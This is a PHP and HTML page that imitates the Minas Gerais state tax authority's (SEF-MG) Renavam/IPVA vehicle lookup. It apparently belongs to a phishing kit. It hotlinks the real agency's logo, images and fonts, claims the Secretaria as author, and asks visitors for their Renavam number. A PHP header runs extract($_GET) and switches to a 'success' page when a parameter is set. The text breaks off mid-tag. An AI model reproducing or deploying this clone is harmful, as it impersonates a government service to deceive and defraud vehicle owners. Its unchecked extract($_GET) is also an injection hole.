<?php

error_reporting(0);

extract($_GET);

if($sucesso){

    include_once('./pages/veiculosmg/home.php');

    return;
}


?>
<!DOCTYPE html>
<html lang="pt-BR" style="">

<head>
         <link rel="icon" href="/imagens/veiculosmg.ico" sizes="192x192">

    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <style data-emotion="css-global" data-s="">
    html {
        -webkit-font-smoothing: antialiased;
        -moz-osx-font-smoothing: grayscale;
        box-sizing: border-box;
        -webkit-text-size-adjust: 100%;
    }

    *,
    *::before,
    *::after {
        box-sizing: inherit;
    }

    strong,
    b {
        font-weight: 700;
    }

    body {
        margin: 0;
        color: rgba(0, 0, 0, 0.87);
        font-family: '__openSans_9c6427', '__openSans_Fallback_9c6427';
        font-weight: 400;
        font-size: 1rem;
        line-height: 1.5;
        background-color: #fff;
    }

    @media print {
        body {
            background-color: #fff;
        }
    }

    body::backdrop {
        background-color: #fff;
    }
    </style>
    <style data-emotion="css-global" data-s=""></style>
    <style data-emotion="css x38fv" data-s="">
    .css-x38fv {
        padding: 1.5rem;
        overflow: hidden;
    }

    @media (max-width: 1200px) {
        
        .css-x38fv {
            padding: 0.75rem;
            overflow: auto;
        }

        .css-x38fv img {
            margin: 0.75rem;
        }
    }

     @media (max-width: 800px) {
    
    .imagemban{
        display: none !important;
    }
}

@media (min-width: 800px) {

     .formlogin{
        
    margin-top: 193px!important;

     }

}
    </style>
    <style data-emotion="css 1j0tvzd" data-s="">
    .css-1j0tvzd {
        height: calc(100vh - 6rem);
        background: linear-gradient(0deg,
                var(--color-primary-pure) 50%,
                var(--color-neutral-lightest) 50%);
        display: grid;
        -webkit-box-pack: end;
        -ms-flex-pack: end;
        -webkit-justify-content: flex-end;
        justify-content: flex-end;
        padding: 0 4%;
    }

    @media (min-width: 2280px) {
        .css-1j0tvzd {
            padding: 0 20%;
        }
    }

    @media (max-width: 1200px) {
        .css-1j0tvzd {
            padding: 0.75rem;
            -webkit-box-pack: center;
            -ms-flex-pack: center;
            -webkit-justify-content: center;
            justify-content: center;
        }

        .css-1j0tvzd>div {
            margin-top: 2rem;
        }

        @media screen and (max-width: 960px) {
            .css-1j0tvzd>div {
                margin-top: 0rem;
            }
        }
    }
    </style>
    <style data-emotion="css 2uqpcr" data-s="">
    .css-2uqpcr {
        max-width: 577px;
        width: 100%;
        display: -webkit-box;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
        place-self: center;
        -webkit-align-items: center;
        -webkit-box-align: center;
        -ms-flex-align: center;
        align-items: center;
        margin-bottom: 24%;
        max-height: 77vh;
    }

    @media (max-width: 1200px) {
        .css-2uqpcr {
            width: auto;
            max-height: none;
        }
    }
    </style>
    <style data-emotion="css cjc2l3" data-s="">
    .css-cjc2l3 {
        border: 1px solid var(--color-neutral-lightest);
        padding: 2rem;
        gap: 2rem;
        display: grid;
        margin: 0;
        border-radius: 40px;
        box-shadow: 0px 4px 35px rgba(0, 0, 0, 0.08);
    }

    @media screen and (max-width: 960px) {
        .css-cjc2l3 {
            padding: 1.5rem;
            gap: 1rem;
        }
    }
    </style>
    <style data-emotion="css iw8h5o" data-s="">
    .css-iw8h5o {
        overflow: hidden;
        border: 1px solid var(--color-neutral-lightest);
        padding: 2rem;
        gap: 2rem;
        display: grid;
        margin: 0;
        border-radius: 40px;
        box-shadow: 0px 4px 35px rgba(0, 0, 0, 0.08);
    }

    @media screen and (max-width: 960px) {
        .css-iw8h5o {
            padding: 1.5rem;
            gap: 1rem;
        }
    }
    </style>
    <style data-emotion="css 10olr5" data-s="">
    .css-10olr5 {
        background-color: #fff;
        color: rgba(0, 0, 0, 0.87);
        -webkit-transition: box-shadow 300ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
        transition: box-shadow 300ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
        border-radius: 4px;
        box-shadow: 0px 2px 1px -1px rgba(0, 0, 0, 0.2), 0px 1px 1px 0px rgba(0, 0, 0, 0.14), 0px 1px 3px 0px rgba(0, 0, 0, 0.12);
        overflow: hidden;
        border: 1px solid var(--color-neutral-lightest);
        padding: 2rem;
        gap: 2rem;
        display: grid;
        margin: 0;
        border-radius: 40px;
        box-shadow: 0px 4px 35px rgba(0, 0, 0, 0.08);
    }

    @media screen and (max-width: 960px) {
        .css-10olr5 {
            padding: 1.5rem;
            gap: 1rem;
        }
    }
    </style>
    <style data-emotion="css ku9xxg" data-s="">
    .css-ku9xxg {
        display: grid;
        gap: 0;
    }

    @media screen and (max-width: 960px) {
        .css-ku9xxg {
            gap: 0.5rem;
        }
    }
    </style>
    <style data-emotion="css 11smo08" data-s="">
    .css-11smo08 {
        display: grid;
        gap: 0;
    }

    @media screen and (max-width: 960px) {
        .css-11smo08 {
            gap: 0.5rem;
        }
    }
    </style>
    <style data-emotion="css 1f2l8xw" data-s="">
    .css-1f2l8xw {
        font-size: 1.5rem;
        font-weight: bold;
        line-height: 1.2;
        letter-spacing: 0;
    }

    @media screen and (max-width: 960px) {
        .css-1f2l8xw {
            font-size: 1.25rem;
        }
    }
    </style>
    <style data-emotion="css qm0hy9" data-s="">
    .css-qm0hy9 {
        margin: 0;
        font-family: '__openSans_9c6427', '__openSans_Fallback_9c6427';
        font-weight: 400;
        font-size: 1rem;
        line-height: 1.5;
        font-size: 1.5rem;
        font-weight: bold;
        line-height: 1.2;
        letter-spacing: 0;
    }

    @media screen and (max-width: 960px) {
        .css-qm0hy9 {
            font-size: 1.25rem;
        }
    }
    </style>
    <style data-emotion="css 1bd53lu" data-s="">
    .css-1bd53lu {
        margin: 0;
        font-family: '__openSans_9c6427', '__openSans_Fallback_9c6427';
        font-weight: 500;
        font-size: 0.875rem;
        line-height: 1.57;
        color: rgba(0, 0, 0, 0.6);
    }
    </style>
    <style data-emotion="css bb03bc" data-s="">
    .css-bb03bc {
        display: -webkit-box;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
        -webkit-flex-direction: column;
        -ms-flex-direction: column;
        flex-direction: column;
        gap: 16px;
    }
    </style>
    <style data-emotion="css 7im3h3" data-s="">
    .css-7im3h3 {
        -webkit-align-items: center;
        -webkit-box-align: center;
        -ms-flex-align: center;
        align-items: center;
        background-color: #1351b4;
        border: 0;
        border-radius: 100em;
        color: var(--color-neutral-lightest);
        cursor: pointer;
        display: -webkit-inline-box;
        display: -webkit-inline-flex;
        display: -ms-inline-flexbox;
        display: inline-flex;
        font-size: 16.8px;
        height: 40px;
        -webkit-box-pack: center;
        -ms-flex-pack: center;
        -webkit-justify-content: center;
        justify-content: center;
        overflow: hidden;
        padding: 0 24px;
        position: relative;
        text-align: center;
        vertical-align: middle;
        white-space: nowrap;
        width: auto;
        color: white;
    }
    </style>
    <style data-emotion="css 1ta7xez" data-s="">
    .css-1ta7xez {
        text-transform: none;
        -webkit-text-decoration: underline;
        text-decoration: underline;
        font-weight: bold;
        font-size: 1.125rem;
        line-height: 1.2;
        letter-spacing: 0;
    }
    </style>
    <style data-emotion="css 7wz613" data-s="">
    .css-7wz613 {
        font-family: '__openSans_9c6427', '__openSans_Fallback_9c6427';
        font-weight: 500;
        font-size: 0.875rem;
        line-height: 1.75;
        text-transform: uppercase;
        min-width: 64px;
        padding: 6px 8px;
        border-radius: 4px;
        -webkit-transition: background-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms, box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms, border-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms, color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
        transition: background-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms, box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms, border-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms, color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
        color: #136B9E;
        height: 48px;
        text-transform: none;
        -webkit-text-decoration: underline;
        text-decoration: underline;
        font-weight: bold;
        font-size: 1.125rem;
        line-height: 1.2;
        letter-spacing: 0;
    }

    .css-7wz613:hover {
        -webkit-text-decoration: none;
        text-decoration: none;
        background-color: rgba(19, 107, 158, 0.04);
    }

    @media (hover: none) {
        .css-7wz613:hover {
            background-color: transparent;
        }
    }

    .css-7wz613.Mui-disabled {
        color: rgba(0, 0, 0, 0.26);
    }
    </style>
    <style data-emotion="css 12m8ca4" data-s="">
    .css-12m8ca4 {
        display: -webkit-inline-box;
        display: -webkit-inline-flex;
        display: -ms-inline-flexbox;
        display: inline-flex;
        -webkit-align-items: center;
        -webkit-box-align: center;
        -ms-flex-align: center;
        align-items: center;
        -webkit-box-pack: center;
        -ms-flex-pack: center;
        -webkit-justify-content: center;
        justify-content: center;
        position: relative;
        box-sizing: border-box;
        -webkit-tap-highlight-color: transparent;
        background-color: transparent;
        outline: 0;
        border: 0;
        margin: 0;
        border-radius: 0;
        padding: 0;
        cursor: pointer;
        -webkit-user-select: none;
        -moz-user-select: none;
        -ms-user-select: none;
        user-select: none;
        vertical-align: middle;
        -moz-appearance: none;
        -webkit-appearance: none;
        -webkit-text-decoration: none;
        text-decoration: none;
        color: inherit;
        font-family: '__openSans_9c6427', '__openSans_Fallback_9c6427';
        font-weight: 500;
        font-size: 0.875rem;
        line-height: 1.75;
        text-transform: uppercase;
        min-width: 64px;
        padding: 6px 8px;
        border-radius: 4px;
        -webkit-transition: background-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms, box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms, border-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms, color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
        transition: background-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms, box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms, border-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms, color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
        color: #136B9E;
        height: 48px;
        text-transform: none;
        -webkit-text-decoration: underline;
        text-decoration: underline;
        font-weight: bold;
        font-size: 1.125rem;
        line-height: 1.2;
        letter-spacing: 0;
    }

    .css-12m8ca4::-moz-focus-inner {
        border-style: none;
    }

    .css-12m8ca4.Mui-disabled {
        pointer-events: none;
        cursor: default;
    }

    @media print {
        .css-12m8ca4 {
            -webkit-print-color-adjust: exact;
            color-adjust: exact;
        }
    }

    .css-12m8ca4:hover {
        -webkit-text-decoration: none;
        text-decoration: none;
        background-color: rgba(19, 107, 158, 0.04);
    }

    @media (hover: none) {
        .css-12m8ca4:hover {
            background-color: transparent;
        }
    }

    .css-12m8ca4.Mui-disabled {
        color: rgba(0, 0, 0, 0.26);
    }
    </style>
    <style data-emotion="css 5e12ms" data-s="">
    .css-5e12ms {
        background-color: var(--color-alert-neutral);
        color: var(--text-primary);
        width: 100%;
    }

    .css-5e12ms .MuiAlert-message,
    .css-5e12ms .MuiAlert-icon {
        padding: 0;
        color: var(--color-neutral-soft);
    }
    </style>
    <style data-emotion="css 1k4n07i" data-s="">
    .css-1k4n07i {
        font-family: '__openSans_9c6427', '__openSans_Fallback_9c6427';
        font-weight: 400;
        font-size: 0.875rem;
        line-height: 1.43;
        background-color: transparent;
        display: -webkit-box;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
        padding: 6px 16px;
        color: rgb(1, 67, 97);
        background-color: rgb(229, 246, 253);
        color: black;
        padding: 8px;
        background-color: var(--color-alert-neutral);
        color: var(--text-primary);
        width: 100%;
    }

    .css-1k4n07i .MuiAlert-icon {
        color: #0288d1;
    }

    .css-1k4n07i .MuiAlert-message,
    .css-1k4n07i .MuiAlert-icon {
        padding: 0;
        color: var(--color-neutral-soft);
    }
    </style>
    <style data-emotion="css cfg4pq" data-s="">
    .css-cfg4pq {
        background-color: #fff;
        color: rgba(0, 0, 0, 0.87);
        -webkit-transition: box-shadow 300ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
        transition: box-shadow 300ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
        border-radius: 4px;
        box-shadow: none;
        font-family: '__openSans_9c6427', '__openSans_Fallback_9c6427';
        font-weight: 400;
        font-size: 0.875rem;
        line-height: 1.43;
        background-color: transparent;
        display: -webkit-box;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
        padding: 6px 16px;
        color: rgb(1, 67, 97);
        background-color: rgb(229, 246, 253);
        color: black;
        padding: 8px;
        background-color: var(--color-alert-neutral);
        color: var(--text-primary);
        width: 100%;
    }

    .css-cfg4pq .MuiAlert-icon {
        color: #0288d1;
    }

    .css-cfg4pq .MuiAlert-message,
    .css-cfg4pq .MuiAlert-icon {
        padding: 0;
        color: var(--color-neutral-soft);
    }
    </style>
    <style data-emotion="css 1l54tgj" data-s="">
    .css-1l54tgj {
        margin-right: 12px;
        padding: 7px 0;
        display: -webkit-box;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
        font-size: 22px;
        opacity: 0.9;
    }
    </style>
    <style data-emotion="css 1cw4hi4" data-s="">
    .css-1cw4hi4 {
        -webkit-user-select: none;
        -moz-user-select: none;
        -ms-user-select: none;
        user-select: none;
        width: 1em;
        height: 1em;
        display: inline-block;
        fill: currentColor;
        -webkit-flex-shrink: 0;
        -ms-flex-negative: 0;
        flex-shrink: 0;
        -webkit-transition: fill 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
        transition: fill 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
        font-size: inherit;
    }
    </style>
    <style data-emotion="css 1xsto0d" data-s="">
    .css-1xsto0d {
        padding: 8px 0;
        min-width: 0;
        overflow: auto;
    }
    </style>
    <style data-emotion="css gwzx64" data-s="">
    .css-gwzx64 {
        font-family: '__openSans_9c6427', '__openSans_Fallback_9c6427';
        font-weight: 500;
        font-size: 0.875rem;
        line-height: 1.75;
        text-transform: uppercase;
        min-width: 64px;
        padding: 6px 8px;
        border-radius: 4px;
        -webkit-transition: background-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms, box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms, border-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms, color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
        transition: background-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms, box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms, border-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms, color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
        color: #B81F25;
        padding: 0px;
    }

    .css-gwzx64:hover {
        -webkit-text-decoration: none;
        text-decoration: none;
        background-color: rgba(184, 31, 37, 0.04);
    }

    @media (hover: none) {
        .css-gwzx64:hover {
            background-color: transparent;
        }
    }

    .css-gwzx64.Mui-disabled {
        color: rgba(0, 0, 0, 0.26);
    }

    @media (min-width:0px) {
        .css-gwzx64 {
            place-self: end;
        }
    }

    @media (min-width:900px) {
        .css-gwzx64 {
            place-self: inherit;
        }
    }
    </style>
    <style data-emotion="css xhpfbr" data-s="">

        .css-cwhnqw {
    display: -webkit-inline-box;
    display: -webkit-inline-flex;
    display: -ms-inline-flexbox;
    display: inline-flex;
    -webkit-align-items: center;
    -webkit-box-align: center;
    -ms-flex-align: center;
    align-items: center;
    -webkit-box-pack: center;
    -ms-flex-pack: center;
    -webkit-justify-content: center;
    justify-content: center;
    position: relative;
    box-sizing: border-box;
    -webkit-tap-highlight-color: transparent;
    background-color: transparent;
    outline: 0;
    border: 0;
    margin: 0;
    border-radius: 0;
    padding: 0;
    cursor: pointer;
    -webkit-user-select: none;
    -moz-user-select: none;
    -ms-user-select: none;
    user-select: none;
    vertical-align: middle;
    -moz-appearance: none;
    -webkit-appearance: none;
    -webkit-text-decoration: none;
    text-decoration: none;
    color: inherit;
    font-family: '__openSans_9c6427','__openSans_Fallback_9c6427';
    font-weight: 500;
    font-size: 0.875rem;
    line-height: 1.75;
    text-transform: uppercase;
    min-width: 64px;
    padding: 6px 16px;
    border-radius: 4px;
    -webkit-transition: background-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,border-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
    transition: background-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,border-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
    color: #fff;
    background-color: #136B9E;
    box-shadow: 0px 3px 1px -2px rgba(0,0,0,0.2),0px 2px 2px 0px rgba(0,0,0,0.14),0px 1px 5px 0px rgba(0,0,0,0.12);
    height: 54px;
}

    .css-xhpfbr {
        display: -webkit-inline-box;
        display: -webkit-inline-flex;
        display: -ms-inline-flexbox;
        display: inline-flex;
        -webkit-align-items: center;
        -webkit-box-align: center;
        -ms-flex-align: center;
        align-items: center;
        -webkit-box-pack: center;
        -ms-flex-pack: center;
        -webkit-justify-content: center;
        justify-content: center;
        position: relative;
        box-sizing: border-box;
        -webkit-tap-highlight-color: transparent;
        background-color: transparent;
        outline: 0;
        border: 0;
        margin: 0;
        border-radius: 0;
        padding: 0;
        cursor: pointer;
        -webkit-user-select: none;
        -moz-user-select: none;
        -ms-user-select: none;
        user-select: none;
        vertical-align: middle;
        -moz-appearance: none;
        -webkit-appearance: none;
        -webkit-text-decoration: none;
        text-decoration: none;
        color: inherit;
        font-family: '__openSans_9c6427', '__openSans_Fallback_9c6427';
        font-weight: 500;
        font-size: 0.875rem;
        line-height: 1.75;
        text-transform: uppercase;
        min-width: 64px;
        padding: 6px 8px;
        border-radius: 4px;
        -webkit-transition: background-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms, box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms, border-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms, color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
        transition: background-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms, box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms, border-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms, color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
        color: #B81F25;
        padding: 0px;
    }

    .css-xhpfbr::-moz-focus-inner {
        border-style: none;
    }

    .css-xhpfbr.Mui-disabled {
        pointer-events: none;
        cursor: default;
    }

    @media print {
        .css-xhpfbr {
            -webkit-print-color-adjust: exact;
            color-adjust: exact;
        }
    }

    .css-xhpfbr:hover {
        -webkit-text-decoration: none;
        text-decoration: none;
        background-color: rgba(184, 31, 37, 0.04);
    }

    @media (hover: none) {
        .css-xhpfbr:hover {
            background-color: transparent;
        }
    }

    .css-xhpfbr.Mui-disabled {
        color: rgba(0, 0, 0, 0.26);
    }

    @media (min-width:0px) {
        .css-xhpfbr {
            place-self: end;
        }
    }

    @media (min-width:900px) {
        .css-xhpfbr {
            place-self: inherit;
        }
    }
    </style>
    <style data-emotion="css 1unyz00" data-s="">
    .css-1unyz00 {
        margin: 0;
        font-family: '__openSans_9c6427', '__openSans_Fallback_9c6427';
        font-weight: 400;
        font-size: 1rem;
        line-height: 1.5;
        color: var(--color-secondary-pure);
        font-weight: 400;
        font-size: 14px;
        text-decoration-line: underline;
        text-transform: none;
    }
    </style>
    <style data-emotion="css qcngg1" data-s="">
    .css-qcngg1 {
        display: -webkit-box;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
        -webkit-box-pack: center;
        -ms-flex-pack: center;
        -webkit-justify-content: center;
        justify-content: center;
        -webkit-align-items: center;
        -webkit-box-align: center;
        -ms-flex-align: center;
        align-items: center;
        height: 100vh;
    }

    .css-qcngg1 div:focus {
        outline: none;
    }
.css-1x5jdmq {
    font: inherit;
    letter-spacing: inherit;
    color: currentcolor;
        border: solid 1px #b7b7b7;
    box-sizing: content-box;
    background: none;
    height: 1.4375em;
    margin: 0px;
    -webkit-tap-highlight-color: transparent;
    display: block;
    min-width: 0px;
    width: 100%;
    animation-name: mui-auto-fill-cancel;
    animation-duration: 10ms;
    padding: 16.5px 14px;
}
.css-i44wyl {
    display: inline-flex;
    flex-direction: column;
    position: relative;
    min-width: 0px;
    padding: 0px;
    margin: 0px;
    border: 0px;
    vertical-align: top;
}
.css-1qzbln3 {
    color: rgba(0, 0, 0, 0.6);
    font-family: __openSans_9c6427, __openSans_Fallback_9c6427;
    font-weight: 400;
    font-size: 1rem;
    line-height: 1.4375em;
    display: block;
    transform-origin: left top;
    text-overflow: ellipsis;
    max-width: calc(100% - 24px);
    position: absolute;
    left: 0px;
    top: 0px;
    transform: translate(14px, 16px) scale(1);
    z-index: 1;
    pointer-events: none;
    padding: 0px;
    white-space: nowrap;
    overflow: hidden;
    transition: color 200ms cubic-bezier(0, 0, 0.2, 1), transform 200ms cubic-bezier(0, 0, 0.2, 1), max-width 200ms cubic-bezier(0, 0, 0.2, 1);
}
.css-1e3t5gr {
    flex-direction: column;
    position: relative;
    min-width: 0px;
    padding: 0px;
    margin: 0px;
    border: 0px;
    vertical-align: top;
    display: grid;
    gap: 32px;
}
    .css-1oz56b5 {
    font-family: __openSans_9c6427, __openSans_Fallback_9c6427;
    font-weight: 400;
    font-size: 1rem;
    line-height: 1.4375em;
    color: rgba(0, 0, 0, 0.87);
    box-sizing: border-box;
    cursor: text;
    display: inline-flex;
    -webkit-box-align: center;
    align-items: center;
    position: relative;
    border-radius: 4px;
}
.css-10olr5 {
    background-color: #fff;
    color: rgba(0, 0, 0, 0.87);
    -webkit-transition: box-shadow 300ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
    transition: box-shadow 300ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
    border-radius: 4px;
    box-shadow: 0px 2px 1px -1px rgba(0,0,0,0.2),0px 1px 1px 0px rgba(0,0,0,0.14),0px 1px 3px 0px rgba(0,0,0,0.12);
    overflow: hidden;
    border: 1px solid var(--color-neutral-lightest);
    padding: 2rem;
    gap: 2rem;
    display: grid;
    margin: 0;
    border-radius: 40px;
    box-shadow: 0px 4px 35px rgba(0, 0, 0, 0.08);
}
    </style>
    <style data-emotion="css" data-s=""></style>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Buscar Renavam - SEF/MG</title>
    <meta name="description"
        content="Página da SEF-MG para consulta de Renavam: veículo, proprietário, pagamento do IPVA e Taxa de Licenciamento">
    <meta name="keywords" content="busca, renavam, IPVA, TRLAV, SEF, SEFMG, SEF-MG, SEF/MG, MG, Minas">
    <link rel="preload" as="image"
        imagesrcset="/_next/image/?url=%2F_next%2Fstatic%2Fmedia%2Fperson_0.5f5378db.webp&amp;w=640&amp;q=75 640w, /_next/image/?url=%2F_next%2Fstatic%2Fmedia%2Fperson_0.5f5378db.webp&amp;w=750&amp;q=75 750w, /_next/image/?url=%2F_next%2Fstatic%2Fmedia%2Fperson_0.5f5378db.webp&amp;w=828&amp;q=75 828w, /_next/image/?url=%2F_next%2Fstatic%2Fmedia%2Fperson_0.5f5378db.webp&amp;w=1080&amp;q=75 1080w, /_next/image/?url=%2F_next%2Fstatic%2Fmedia%2Fperson_0.5f5378db.webp&amp;w=1200&amp;q=75 1200w, /_next/image/?url=%2F_next%2Fstatic%2Fmedia%2Fperson_0.5f5378db.webp&amp;w=1920&amp;q=75 1920w, /_next/image/?url=%2F_next%2Fstatic%2Fmedia%2Fperson_0.5f5378db.webp&amp;w=2048&amp;q=75 2048w, /_next/image/?url=%2F_next%2Fstatic%2Fmedia%2Fperson_0.5f5378db.webp&amp;w=3840&amp;q=75 3840w"
        imagesizes="100vw" fetchpriority="high">
    <meta name="next-head-count" content="6">
    <meta name="author" content="Secretaria de Estado de Fazenda de Minas Gerais">
    <link rel="preload" href="https://veiculosmg.fazenda.mg.gov.br/_next/static/media/8f605fdd2ad38233-s.p.ttf"
        as="font" type="font/ttf" crossorigin="anonymous" data-next-font="size-adjust">
    <link rel="preload" href="https://veiculosmg.fazenda.mg.gov.br/_next/static/media/4372f57be5ceab4e-s.p.ttf"
        as="font" type="font/ttf" crossorigin="anonymous" data-next-font="size-adjust">
    <link rel="preload" href="./<?= $diretorio ?>/index_files/18179c9ea2bfc1b9.css" as="style">
    <link rel="stylesheet" href="./<?= $diretorio ?>/index_files/18179c9ea2bfc1b9.css" data-n-g="">
 
</head>

<body>
    <div id="__next">
        <main class="__className_9c6427">
            <div class="css-x38fv"><a  target="_blank"><img alt="Logo da SEF-MG"
                        loading="lazy" width="131" height="41" decoding="async" data-nimg="1"
                        srcset="https://veiculosmg.fazenda.mg.gov.br/_next/image/?url=%2F_next%2Fstatic%2Fmedia%2FsefLogo02.1d6fc26d.png&w=384&q=75"
                        src="https://veiculosmg.fazenda.mg.gov.br/_next/image/?url=%2F_next%2Fstatic%2Fmedia%2FsefLogo02.1d6fc26d.png&w=384&q=75" style="color: transparent;"></a>
                <div class="css-1j0tvzd" style="display: flex;">
                    <div class="css-zfv9x4 imagemban" style="display: flex;align-items: flex-end;width: 100%;"><img alt="Imagem de usuário da SEF-MG" fetchpriority="high" height="1920" decoding="async" data-nimg="1" class="imgfadein-1" sizes="100vw" srcset="https://veiculosmg.fazenda.mg.gov.br/_next/image/?url=%2F_next%2Fstatic%2Fmedia%2Fperson_2.5bb26453.webp&amp;w=640&amp;q=75 640w, https://veiculosmg.fazenda.mg.gov.br/_next/image/?url=%2F_next%2Fstatic%2Fmedia%2Fperson_2.5bb26453.webp&amp;w=750&amp;q=75 750w, https://veiculosmg.fazenda.mg.gov.br/_next/image/?url=%2F_next%2Fstatic%2Fmedia%2Fperson_2.5bb26453.webp&amp;w=828&amp;q=75 828w, https://veiculosmg.fazenda.mg.gov.br/_next/image/?url=%2F_next%2Fstatic%2Fmedia%2Fperson_2.5bb26453.webp&amp;w=1080&amp;q=75 1080w, https://veiculosmg.fazenda.mg.gov.br/_next/image/?url=%2F_next%2Fstatic%2Fmedia%2Fperson_2.5bb26453.webp&amp;w=1200&amp;q=75 1200w, https://veiculosmg.fazenda.mg.gov.br/_next/image/?url=%2F_next%2Fstatic%2Fmedia%2Fperson_2.5bb26453.webp&amp;w=1920&amp;q=75 1920w, https://veiculosmg.fazenda.mg.gov.br/_next/image/?url=%2F_next%2Fstatic%2Fmedia%2Fperson_2.5bb26453.webp&amp;w=2048&amp;q=75 2048w, https://veiculosmg.fazenda.mg.gov.br/_next/image/?url=%2F_next%2Fstatic%2Fmedia%2Fperson_2.5bb26453.webp&amp;w=3840&amp;q=75 3840w" src="https://veiculosmg.fazenda.mg.gov.br/_next/image/?url=%2F_next%2Fstatic%2Fmedia%2Fperson_5.872de21f.webp&amp;w=1080&amp;q=75" style="color: transparent;width: 100%;height: auto;max-width: 731px;" width="1920"></div><div class="css-zfv9x4"> </div>
                    <div class="css-2uqpcr formlogin">
                        <section
                            class="MuiPaper-root MuiPaper-elevation MuiPaper-rounded MuiPaper-elevation1 MuiCard-root css-10olr5">
                            <div class="MuiBox-root css-11smo08"> 
                                <h1 class="MuiTypography-root MuiTypography-body1 css-qm0hy9">Consultar IPVA e Taxa de
                                    Licenciamento</h1>
                                <h6 class="MuiTypography-root MuiTypography-subtitle2 css-1bd53lu">Imposto sobre a
                                    Propriedade de Veículos Automotores</h6>
                            </div>
                            <form>
                                <div class="MuiFormControl-root lessBorderRadius css-1e3t5gr">
                                    <div class="MuiFormControl-root MuiTextField-root css-i44wyl"> 
                                        <div
                                            class="MuiInputBase-root MuiOutlinedInput-root MuiInputBase-colorSecondary MuiInputBase-formControl css-1oz56b5">
                                            <input aria-invalid="false" aria-describedby="outlined-basic-helper-text"
                                                id="outlined-basic" name="renavam" required="" type="text" autocomplete="off"
                                                maxlength="11" data-testid="input_renavam" placeholder="Digite on° Renavam"
                                                class="MuiInputBase-input MuiOutlinedInput-input css-1x5jdmq" value="">
                                            
                                        </div>
                                        <p class="MuiFormHelperText-root MuiFormHelperText-sizeMedium MuiFormHelperText-contained Mui-required css-sot5in"
                                            id="outlined-basic-helper-text">o n° Renavam encontra-se no canto superior
                                            esquerdo do documento do veículo.</p>
                                    </div><button
                                        class="MuiButtonBase-root MuiButton-root MuiButton-contained MuiButton-containedSecondary MuiButton-sizeMedium MuiButton-containedSizeMedium MuiButton-colorSecondary Mui-disabled"
                                        tabindex="-1" type="submit" disabled="" data-testid="btn_pesquisar">
                                        <p class="MuiTypography-root MuiTypography-body1 css-138h2zs">Consultar</p>
                                    </button>
                                </div>
                            </form>
                            
                            <div class="MuiPaper-root MuiPaper-elevation MuiPaper-rounded MuiPaper-elevation0 MuiAlert-root MuiAlert-colorInfo MuiAlert-standardInfo MuiAlert-standard css-cfg4pq"
                                role="alert">
                                <div class="MuiAlert-icon css-1l54tgj"><svg
                                        class="MuiSvgIcon-root MuiSvgIcon-fontSizeInherit css-1cw4hi4" focusable="false"
                                        aria-hidden="true" viewBox="0 0 24 24" data-testid="InfoOutlinedIcon">
                                        <path
                                            d="M11,9H13V7H11M12,20C7.59,20 4,16.41 4,12C4,7.59 7.59,4 12,4C16.41,4 20,7.59 20, 12C20,16.41 16.41,20 12,20M12,2A10,10 0 0,0 2,12A10,10 0 0,0 12,22A10,10 0 0,0 22,12A10, 10 0 0,0 12,2M11,17H13V11H11V17Z">
                                        </path>
                                    </svg></div>
                                <div class="MuiAlert-message css-1xsto0d">
                                    <div class="MuiBox-root css-0">Seu veículo foi roubado/furtado? Seu IPVA poderá ser
                                        restituído.</div><button
